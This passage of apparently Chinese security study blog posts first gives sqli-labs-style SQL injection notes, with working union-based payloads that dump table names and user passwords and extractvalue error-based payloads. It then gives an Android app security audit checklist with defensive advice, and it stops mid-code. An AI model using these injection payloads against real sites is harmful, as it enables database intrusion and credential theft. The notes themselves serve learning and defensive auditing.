id="按照查询字段">按照查询字段</h4><p>**字符型：**当输入的参数为字符串时，称为字符型</p><p><strong>数字型</strong>：当输入的参数为整形时，可能为数字型注入</p><h4 id="按照注入方法">按照注入方法</h4><p>Union注入，报错注入，布尔注入，时间注入</p><h4 id="参数是char-or-int">参数是char or int</h4><p>例如：通过 id=1 and 1=2</p><p>如果有回显 为字符型</p><p>如果无回显 为数字型</p><p>如果输入id=1‘报错，可以通过 ‘–+’ 或者 # 或者 %23注释掉多余的闭合</p><h3 id="union联合注入">union联合注入</h3><p>使用联合查询，先要确定有多少列，否则列数不同报错。</p><p><strong>Lesson1</strong></p><ul><li>根据 id=1 and 1=2 /and 1=1判断参数是字符型还是数字型</li><li>如果是字符型，找到闭合方式 ’ “ （ ）</li><li>判断查询列数，group by，order by</li><li>查询回显位置，让想要回显的数据回显出来，不想要的不回显出来</li></ul><p>对于lesson1</p><p>判断出来是字符型，且使用单引号闭合</p><p>使用 id=1‘ group by 3 --+ 查询列数3</p><p>使用 id=1‘ union select 1,2,3 --+ 发现回显还是正常数据，因为页面只能回显一行而union结果是两行，我们想要第二行</p><p>使用 id=0‘ union select 1,2,database() --+ 回显出数据库名称</p><h4 id="union注入思路">union注入思路</h4><p><strong>提前了解</strong></p><p>mysql中存在下面三个关键：</p><p>Information_schema库：包含所有mysql数据库简要信息</p><p>tables表：表名集合</p><p>columns表：列名集合</p><ol><li><p>获得数据库名称：通过上述操作可以获得</p></li><li><p>获得表名称：数据库Information_schema==》tables表==》数据列table_name<br>id=0‘ union select 1,2,table_name from Information_schema.tables where table_scheme=database() --+<br>显示所有表名<br>id=0‘ union select 1,2,group_concat(table_name) from Information_schema.tables where table_scheme=database() --+<br><strong>也可以写成如下：</strong><br>id=0‘ union select 1,2,(select group_concat(table_name) from Information_schema.tables where table_scheme=database()) --+</p></li><li><p>获得所需表的列名<br>id=0‘ union select 1,2,group_concat(column_name) from Information_schema.columns where table_scheme=database() and table_name=‘users’ --+</p></li><li><p>查询最终目标</p><p>id=0‘ union select 1,2,group_concat(usename,‘~’,password) from users --+</p></li></ol><h3 id="报错注入">报错注入</h3><p>报错注入十二种方法：</p><p><img src="assets/image-20241007163640498.png" alt="image-20241007163640498"></p><p>其中前三种比较常见。</p><h4 id="extractValue-函数">extractValue()函数</h4><p>两个参数：</p><p>第一个参数：XML文档对象名称</p><p>第二个参数： 路径</p><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">//首先在phpmyadmin中创库ctfsu和表xml</span><br><span class="line">create database ctfsu charset utf8;</span><br><span class="line">create table xml (doc varchar(150))；</span><br><span class="line"></span><br><span class="line">//表中插入两端内容</span><br><span class="line">insert into xml values(&#x27;</span><br><span class="line">    &lt;book&gt;</span><br><span class="line">    &lt;title&gt;A bad boy how to get a girlfriend&lt;/title&gt;</span><br><span class="line">    &lt;author&gt;</span><br><span class="line">    &lt;initial&gt;Love&lt;/initial&gt;</span><br><span class="line">    &lt;surname&gt;benben&lt;/surname&gt;</span><br><span class="line">    &lt;/author&gt;</span><br><span class="line">    &lt;/book&gt;</span><br><span class="line">&#x27;);</span><br><span class="line"></span><br><span class="line">insert into xml values(&#x27;</span><br><span class="line">    &lt;book&gt;</span><br><span class="line">    &lt;title&gt;how to become a bad boy&lt;/title&gt;</span><br><span class="line">    &lt;author&gt;</span><br><span class="line">    &lt;initial&gt;hualong&lt;/initial&gt;</span><br><span class="line">    &lt;surname&gt;Melton&lt;/surname&gt;</span><br><span class="line">    &lt;/author&gt;</span><br><span class="line">    &lt;/book&gt;</span><br><span class="line">&#x27;);</span><br></pre></td></tr></table></figure><h5 id="使用extractvalue查询xml内容">使用extractvalue查询xml内容</h5><p><strong>查询作者</strong></p><p><code>select extractvalue(doc,'/book/author/surname') from xml</code>;</p><p><strong>查询书名</strong></p><p><code>select extractvalue(doc,'/book/title') from xml</code>;</p><p><strong>查询参数路径写错</strong></p><p><code>select extractvalue(doc,'/book/titlell') from xml</code>;</p><p>查询不到内容，但不会报错</p><p><strong>查询参数格式符号写错</strong></p><p><code>select extractvalue(doc,'~book/title') from xml</code>;</p><p>提示报错信息  ~book/title</p><p><strong>注入利用：</strong></p><p><code>select extractvalue(doc,concat(0x7e,(select database()))) from xml</code>;</p><p>其中0x7e是 ==》 ~ ，并且报错注入时不必关心extractValue的第一个参数</p><p>concat：将参数拼接</p><p>extractValue报错注入只能回显32个字符串：可以使用substring解决这个问题</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">substring</span><span class="params">(args1,args2,args3)</span></span></span><br><span class="line">第一个参数是字符串</span><br><span class="line">第二个参数是从第几个字符开始</span><br><span class="line">第三个参数是控制显示几个</span><br><span class="line"></span><br><span class="line">示例</span><br><span class="line"><span class="function"><span class="title">substring</span><span class="params">(<span class="number">123456</span>,<span class="number">1</span>,<span class="number">3</span>)</span></span> ==&gt;输出 <span class="number">123</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>APP安全分析</h1><h2 id="manifest文件检测">manifest文件检测</h2><h3 id="PermissionGroup检测">PermissionGroup检测</h3><p><strong>permission标签</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:permissionGroup</span>=<span class="string">&quot;string&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:protectionLevel</span>=<span class="string">[</span>&quot;<span class="attr">normal</span>&quot; | &quot;<span class="attr">dangerous</span>&quot; |</span></span><br><span class="line"><span class="tag">                                     &quot;<span class="attr">signature</span>&quot; | <span class="attr">...</span>] /&gt;</span></span><br><span class="line"></span><br><span class="line">//android:name ：用于在代码中（例如，在 <span class="tag">&lt;<span class="name">uses-permission</span>&gt;</span> 元素或应用组件的 permission 属性中）引用权限的名称</span><br><span class="line">    </span><br><span class="line">//android:permissionGroup : 将此权限分配给一个组。此属性的值是该组的名称，使用此应用或其他应用中的 <span class="tag">&lt;<span class="name">permission-group</span>&gt;</span> 元素声明。如果未设置此属性，则此权限不会属于某个组。</span><br></pre></td></tr></table></figure><p>用法：声明对于限制对此应用或其他应用的特定组件或功能的访问权限的安全权限。</p><p><strong>permission-group标签</strong></p><p>声明相关权限的逻辑分组的名称。各个权限通过 <code>&lt;permission&gt;</code> 元素的 <code>permissionGroup</code> 属性加入权限组中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission-group</span> <span class="attr">android:description</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:icon</span>=<span class="string">&quot;drawable resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:label</span>=<span class="string">&quot;string resource&quot;</span></span></span><br><span class="line"><span class="tag">                  <span class="attr">android:name</span>=<span class="string">&quot;string&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">// android:name : 权限组的名称。这是可以分配给<span class="tag">&lt;<span class="name">permission</span>&gt;</span>元素的android:permissionGroup属性的名称</span><br></pre></td></tr></table></figure><p>如果在<code>&lt;permission&gt;</code>标签有permissionGroup属性，那么值应该不为空。如果permissionGroup的属性为空，会导致权限定义无效，且其他app无法使用该权限。</p><h3 id="AndroidManifest文件中系统权限使用检测"><strong>AndroidManifest文件中系统权限使用检测</strong></h3><p>当app如果使用了一些系统限制权限，如<code>android.permission.WRITE_SECURE_SETTINGS`和`android.permission.INSTALL_PACKAGES</code>，则应该是系统或者谷歌自带的app应用，否则就是一个恶意的app</p><p>若app使用下述权限，则app有较高的权限，要谨慎使用</p><ul><li><code>android.permission.MOUNT_FORMAT_FILESYSTEMS</code></li><li><code>android.permission.MOUNT_UNMOUNT_FILESYSTEMS</code></li><li><code>android.permission.RESTART_PACKAGES</code></li></ul><p>检测<code>&lt;uses-permission&gt;</code>中是否涉及以下权限的申请，若有其中的<strong>任何一个存在</strong>，则将该扫描项标注为提醒，并将又问题的代码段标注出来。</p><p><strong>对于上述权限功能补充</strong></p><ul><li>android.permission.WRITE_SECURE_SETTINGS：允许应用程序读取或者写入安全系统设置</li><li>android.permission.INSTALL_PACKAGES：允许程序安装应用</li><li>android.permission.MOUNT_FORMAT_FILESYSTEMS：允许程序格式化可移动文件系统，比如格式化清空sd卡</li><li>android.permission.MOUNT_UNMOUNT_FILESYSTEMS：允许程序挂载，反挂载外部文件系统</li><li>android.permission.RESTART_PACKAGES：允许应用程序重启其他应用程序，这个权限通常只对系统应用和特定的签名应用可用，普通应用无法使用</li></ul><h3 id="AndroidManifest危险ProtectionLevel权限检测">AndroidManifest危险ProtectionLevel权限检测</h3><p>由于 自定义的permission的protectionLevel属性设置不当，会导致组件数据泄露危险。最好设置权限为```signature<code>和</code>signatureOrSystem``。</p><p>未设置protectionLevel属性的时候默认为normal，若protectionLevel属性为normal或者是dangerous或者未设置protectionLevel，均认为不安全。</p><p><img src="assets/image-20240919202911887.png" alt="image-20240919202911887"></p><h3 id="AndroidManifest-sharedUserId-检测">AndroidManifest sharedUserId 检测</h3><p><a href="https://www.cnblogs.com/wotakuc/archive/2013/03/27/2984423.html">Android sharedUserId研究记录 - wotakuc - 博客园 (cnblogs.com)</a></p><p>通过sharedUserld可以让拥有同一个user id的多个apk运行在同一个进程当中(这个sharedUserid可以随便设置)，互相访问任意资源。sharedUserid设置为<code>android.uid.system</code>，可以把app放到系统进程中，app将获得极大的权限，如果app同时有master key漏洞，容易被root</p><p>如果sharedUserId设置为<code>android.uid.system</code>且app有master key漏洞，则是<code>高危</code>漏洞；若没有master key漏洞，则是<code>提醒</code></p><p>先检测app/build.gradle中的minSdkVersion，若 &lt;= 19，则说明其运行的系统可能存在mster key漏洞（Android系统 &lt;= 4.4，即API Level &lt;= 19存在master key漏洞）。此时若sharedUserId设置为<code>android.uid.system</code>，则标注为<code>高危</code>漏洞；若minSdkVersion &gt;19 则是提醒。</p><p>当程序a和程序b中声明了同一个sharedUserid后，如果b想要获取a程序当中的一些资源，可以通过api  <strong>createPackageContext</strong>获取a程序的context，然后进一步获取a的资源或数据</p><h3 id="AndroidManifest-allowBackup检测">AndroidManifest allowBackup检测</h3><p>当API Level&gt;= 8时（其实小于8的API版本现在已经灭绝了），allowBackup这个标志被设置成true或<strong>不设置该标志位</strong>时，应用程序数据可以备份和恢复，adb调试备份允许恶意攻击者复制应用程序数据。</p><p>若要备份程序的数据，可以采用设置自动备份程序的参数<code>android:fullBackupContent=String</code>，并添加相应的规则进行限制，这个自动备份会将用户保留在设备中的数据自动上传至用户的Google Drive账户。在android 6.0引入的，使用方式如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">package</span>=<span class="string">&quot;com.my.appexample&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">app</span> <span class="attr">...</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/mybackupscheme&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">app</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>android:fullBackupContent</code>属性指定了一个 XML 文件。该文件名为mybackupscheme.xml，位于应用开发项目的 res/xml/ 目录中。 此配置文件包括关于要备份哪些文件的规则。 下列示例代码显示了将某一特定文件排除在备份之外的配置文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">full-backup-content</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">exclude</span> <span class="attr">domain</span>=<span class="string">&quot;database&quot;</span> <span class="attr">path</span>=<span class="string">&quot;device_info.db&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">full-backup-content</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="AndroidManifest-Debuggable检测">AndroidManifest Debuggable检测</h3><p>在AndroidManifest.xml中定义Debuggable项，如果该项被打开，app存在被恶意程序调试的风险，可能导致泄露敏感信息等问题。默认值 false</p><p>风险等级：<code>高危</code></p><h3 id="非必要权限检测">非必要权限检测</h3><p>检测在生产环境中不必要使用的权限</p><ul><li><code>android.permission.ACCESS_MOCK_LOCATION</code>该权限是使在模拟器中使用，用于获取模拟定位信息，安装在用户手机中的应用不应该申请该权限。</li></ul><p>风险等级：<code>提醒</code></p><h3 id="app最低版本检查">app最低版本检查</h3><p>罗列出跟最低版本相关的漏洞和bug，提醒开发者注意自己应用支持的最低版本的系统可能存在的问题</p><p>检测app/build.gradle中的minSdkVersion确定APP所支持的最低版本的系统API，对应到相应的Android版本上。</p><h2 id="组件安全检测">组件安全检测</h2><h3 id="Activity组件导出检测">Activity组件导出检测</h3><p>Activity组件对外暴露会导致数据泄露和恶意的dos攻击</p><p><strong>风险等级</strong>：提醒</p><p><strong>检测规则 ：</strong></p><ol><li>先检查组件的android:exported属性的值，若为true或者未设定该属性的值，则继续第二步操作；若为false，则是安全的</li><li>若组件含有标签，即使未设置exported属性，默认也会设置为true，若组件不含有标签，则未设置exported属性值，默认会设置为true，如果是false则是安全的，若是true，则进行第三步</li><li>判断android:permission属性的值，空，normal，dangerous是不安全的，signature、signatureOrSystem是安全的。</li></ol><p><strong>建议：</strong></p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li></ul><h3 id="service组件导出检测">service组件导出检测</h3><p>Service组件对外暴露会导致数据泄露和恶意的dos攻击。</p><p><strong>风险等级</strong>： <code>提醒</code></p><p>检测规则：</p><p>规则同1</p><p><strong>建议</strong>：</p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li></ul><h3 id="Receiver组件导出检测">Receiver组件导出检测</h3><p>Receiver组件对外暴露会导致数据泄露和恶意的dos攻击。</p><p>风险等级： <code>提醒</code></p><p>检测规则：</p><p>规则同1</p><p>建议：</p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对跨应用间调用的组件或者公开的receiver、service、activity和activity-alias设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>组件传输数据验证。对组件之间，特别是跨应用的组件之间的数据传入与返回做验证和增加异常处理，防止恶意调试数据传入，更要防止敏感数据返回</li></ul><h3 id="Provider组件导出检测">Provider组件导出检测</h3><p>provider组件导出可能会带来信息泄露隐患。API Level在17以下的所有应用的<code>android:exported</code>属性默认值为true，17及以上默认值为false。</p><p>风险等级：<code>提醒</code></p><p>检测规则：</p><p>规则同1</p><p>建议：</p><ul><li>最小化组件暴露。对不会参与跨应用调用的组件添加<code>android:exported=false</code>属性</li><li>设置组件访问权限。对导出的provider组件设置权限，同时将权限的protectionLevel设置为<code>signature</code>或<code>signatureOrSystem</code></li><li>由于contentprovider无法在android2.2（API-8）申明为私有。故建议将<code>minSdkVersion</code>设为8以上。</li></ul><h3 id="ContentProvider目录遍历漏洞检测">ContentProvider目录遍历漏洞检测</h3><p>该漏洞由于Content Provider组件暴露，没有对这个组件访问权限进行限制且对Uri路径没有进行过滤，攻击者通过Content Provider实现的OpenFile接口进行攻击，通过<code>../</code>的方式访问任意的目录文件，造成隐私泄露</p><p><strong>检测等级</strong>：提醒</p><p><strong>检测方法</strong>：</p><ol><li>找到导出的provider组件</li><li>使用Android安全分析框架Drozer动态分析APK，需要安装安卓模拟器（安装了<em>Genymotion</em>，基于X86 + ARM支持包）</li><li>、使用adb 进行端口转发，转发到Drozer使用的端口31415<br>adb forward tcp:31415 tcp:31415</li><li>在安卓设备上开启Drozer Agent 在PC上启动Drozer<br><code>drozeer console connect</code></li><li>在Drozer控制台中使用命令，分析目标apk是否存在目录遍历漏洞<br><code>run scanner.provider.traversal -a &lt;package0-name&gt;</code></li></ol><p><strong>建议</strong>：</p><ul><li><p>将不必要的Connect Provider设置为不可导出</p></li><li><p>由于Android组件Content Provider无法在Android 2.2(API Level 8)系统上设置不可导出，因此如果希望Content Provider不可导出，建议声明的最低SDK版本为8以上版本；由于API Level 17以下的所有应用的<code>android:exported </code>默认值都为true，因此如果应用的Content Provider不必要导出，建议显示设置注册的Content Provider组件的<code>android:exported</code>属性为false；、</p></li><li><p>去除没有必要的OpenFile()接口</p></li><li><p>如果应用的Content Provider组件没有必要实现<code>openFile()</code>接口，阿里聚安全建议移除该Content Provider的不必要的<code>openFile()</code>接口</p></li><li><p>过滤限制跨域访问，对访问的目标文件的路径进行有效判断</p></li><li><p>使用<code>Uri.decode()</code>先对Content Query Uri进行解码后，在过滤如可通过<code>../</code>实现任意可读文件的访问的Uri字符串</p></li><li><p>设置权限来进行内部应用通过Content Provider的数据共享</p></li><li><p>使用签名验证来控制Content Provider共享数据的访问权限，如设置<code>protectionLevel=signature或signatureOrSystem</code></p></li><li><p>提供asset文件时注意权限保护</p></li><li><p>公开的content provider确保不存储敏感数据</p></li></ul><h3 id="Provider：grant-uri-permission属性检测">Provider：grant-uri-permission属性检测</h3><p>grant-uri-permission若设置为true，可被其他程序员通过uri访问到content provider内容，容易造成信息泄露，默认是false</p><p>如果一个Provider是非导出组件的时候，当进行文件共享的时候需要在Intent中加入Grant相关的flags</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_READ_URI_PERMISSION = <span class="number">0x00000001</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_WRITE_URI_PERMISSION = <span class="number">0x00000002</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PERSISTABLE_URI_PERMISSION = <span class="number">0x00000040</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">static</span> <span class="keyword">final</span> <span class="type">int</span> FLAG_GRANT_PREFIX_URI_PERMISSION = <span class="number">0x00000080</span></span><br></pre></td></tr></table></figure><p>这样startActivity内部会判断，如果含有这些Grant flag，将会进行临时性的Uri授权，也包括临的将provider组件export给Intent的目标应用。</p><p><strong>风险等级</strong>：提醒</p><p><strong>问题实例：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>建议：</strong></p><p>如无需对外提供数据，则将content provider的<code>android:grantUriPermissions</code>设置为false。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">provider</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:grantUriPermissions</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Intent-Based攻击检测">Intent-Based攻击检测</h3><p>在AndroidManifest文件中定义了android.intent.category .BROWSABLE属性的组件，可以通过浏览器唤起，这会导致远程命令执行漏洞攻击</p><p><strong>风险等级</strong>：低危</p><p><strong>问题实例</strong>：Activity只有配置了category filter才有被android.intent.category.BROWSABLE通过这种方式在浏览器中打开。通过扫描Manifest中的所有组件，检测出所有组件中的intent-filter带有<code>&lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt;</code>属性的，将其标注为问题代码代码段，并报出低危风险的提示。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>建议</strong>：</p><ul><li>app中任何接收外部输入数据的地方都是潜在的攻击点，<strong>检查并过滤</strong>来自网页的参数</li><li>不要通过网页传输敏感信息，有的网站为了引导已经登录用户到app上使用，会使用脚本动态的生成URL Scheme的参数，其中包括用户名，密码或者登录态token登敏感信息，让用户打开app直接就登录了，恶意应用也可以注册相同的URL Scheme来截取这些敏感信息，Android系统会让用户选择使用哪一个应用打开链接，但是如果用户不注意，就会使用恶意应用打开，导致敏感信息泄露或者其他风险。</li></ul><h3 id="Intent-Scheme-URL漏洞攻击">Intent Scheme URL漏洞攻击</h3><p>Intent Scheme URL是一种特殊的URL格式，用来通过web页面启动已经安装应用的Activity组件，大多数主流浏览器都支持此功能。</p><p>Android Browser的攻击手段 ==》Intent Scheme URLs攻击。这种攻击方式利用了浏览器保护措施不足，通过浏览器作为桥梁间接实现Intent-Based攻击。相比于普通的Intent-Based攻击，这种方式具有隐蔽性。</p><p>如果app中，没有检查获取到的load_url的值，攻击者可以构造钓鱼网站，诱导用户点击加载，就可以盗取用户信息。所以，对Intent URI的的处理不当时，就会导致基于Intent的攻击</p><p><strong>风险等级</strong>：高危</p><p><strong>问题实例</strong>：</p><p>如果浏览器支持Intent Scheme URI语法，一般会分三个步骤进行处理</p><ol><li>利用Intent.parseUri解析uri，获取原始的Intent对象</li><li>对intent对象设置过滤规则</li><li>通过Context.startActivityIfNeeded或者Context.startActivity发送intent，其中第二步起关键作用，过滤规则缺失或者存在缺陷都会导致Intent Scheme URL攻击</li></ol><p>关键在于Intent.parseUri函数，比较安全的使用Intent Scheme URI方法是，如果使用了Intent.parseUri函数，获取的intent对象必须严格过滤，intent至少包含以下三个策略</p><ul><li>addCategory(“android.intent.category.BROWSABLE”)</li><li>setComponent(null)</li><li>setSelector(null)</li></ul><p>通过扫描出所有调用了Intent.parseUri方法的路径，并检测是否使用了上述三个策略，若都是用了则安全，否则高危</p><p>Intent.parseUri函数返回的Intent对象需要按照以下方式进行实现，才可以认为是安全的。</p><p><strong>建议</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将intent的URI(intent scheme URL)转换为intent对象</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> Intent.parseUri(uri);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止在没有设置可浏览的目录(BROWSABLE category)的时候启动活动</span></span><br><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止显式调用(explicit call)</span></span><br><span class="line">intent.setComponent(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 禁止intent的选择器(selector)</span></span><br><span class="line">intent.setSelector(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过intent启动活动</span></span><br><span class="line">context.startActivityIfNeeded(intent, -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h3 id="应用本地拒绝服务漏洞检测">应用本地拒绝服务漏洞检测</h3><p>Android系统提供了Activity，Service，Broadcast Receiver等组件，并且提供了Intent机制来协助应用间的交互和通讯，Intent负责对应用中一次操作的动作，动作设计的数据，附加数据进行描述，Andorid系统根据此Intent的描述，负责找到对应的组件，将Intent传递给调用的组件，并完成组件的调用。</p><p>Andorid应用本地拒绝服务漏洞源于程序没有对Intent.GetxxxExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者可通过向受害者应用发送此类空数据，异常或者畸形数据来达到使该应用Crash的目的，简单的说就是攻击者通过Inent发送的空数据，异常或者畸形数据给受害者应用，导致其崩溃</p><p>**风险等级：**低危</p><p><strong>问题实例</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//源于程序没有对getAction()等获取到的数据进行空指针判断，从而导致了空指针异常导致应用崩溃</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (i.getAction().equals(<span class="string">&quot;TestForNullPointerException&quot;</span>)) 